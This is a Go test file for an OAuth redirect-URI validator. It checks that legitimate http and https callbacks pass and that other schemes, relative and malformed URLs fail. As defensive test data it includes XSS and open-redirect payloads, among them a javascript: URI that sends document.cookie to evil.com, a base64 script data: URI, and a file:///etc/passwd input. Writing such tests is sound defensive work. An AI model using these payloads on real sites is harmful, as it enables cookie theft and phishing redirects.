package oauth

import "testing"

func TestIsValidRedirectURI(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "valid http URL",
			input:    "http://localhost:3000/callback",
			expected: true,
		},
		{
			name:     "valid https URL",
			input:    "https://example.com/oauth/callback",
			expected: true,
		},
		{
			name:     "valid URL with query params",
			input:    "https://example.com/callback?state=xyz",
			expected: true,
		},
		{
			name:     "valid URL with port",
			input:    "http://localhost:8080/auth",
			expected: true,
		},
		{
			name:     "javascript protocol - blocked",
			input:    "javascript:alert('xss')",
			expected: false,
		},
		{
			name:     "data protocol - blocked",
			input:    "data:text/html,<script>alert('xss')</script>",
			expected: false,
		},
		{
			name:     "file protocol - blocked",
			input:    "file:///etc/passwd",
			expected: false,
		},
		{
			name:     "ftp protocol - blocked",
			input:    "ftp://example.com/file",
			expected: false,
		},
		{
			name:     "relative URL - blocked",
			input:    "/callback",
			expected: false,
		},
		{
			name:     "protocol-relative URL - blocked",
			input:    "//example.com/callback",
			expected: false,
		},
		{
			name:     "empty string - blocked",
			input:    "",
			expected: false,
		},
		{
			name:     "malformed URL - blocked",
			input:    "not a url",
			expected: false,
		},
		{
			name:     "URL without host - blocked",
			input:    "http:///path",
			expected: false,
		},
		{
			name:     "URL with fragment",
			input:    "https://example.com/callback#section",
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isValidRedirectURI(tt.input)
			if result != tt.expected {
				t.Errorf("isValidRedirectURI(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestIsValidRedirectURIPreventsOpenRedirect(t *testing.T) {
	// Test common open redirect attack vectors
	attackVectors := []string{
		"javascript:alert(document.domain)",
		"javascript:window.location='http://evil.com/?cookie='+document.cookie",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
		"//evil.com/phishing",
		"/\\evil.com",
	}

	for _, vector := range attackVectors {
		if isValidRedirectURI(vector) {
			t.Errorf("Open redirect vector not blocked: %q", vector)
		}
	}
}

func TestIsValidRedirectURIAllowsLegitimateURLs(t *testing.T) {
	// Test legitimate callback URLs that should be allowed
	legitimateURLs := []string{
		"http://localhost:3000/callback",
		"https://myapp.example.com/oauth/callback",
		"http://127.0.0.1:8080/auth/redirect",
		"https://app.example.com/auth?next=/dashboard",
		"http://localhost/callback?code=xyz&state=abc",
	}

	for _, url := range legitimateURLs {
		if !isValidRedirectURI(url) {
			t.Errorf("Legitimate URL blocked: %q", url)
		}
	}
}
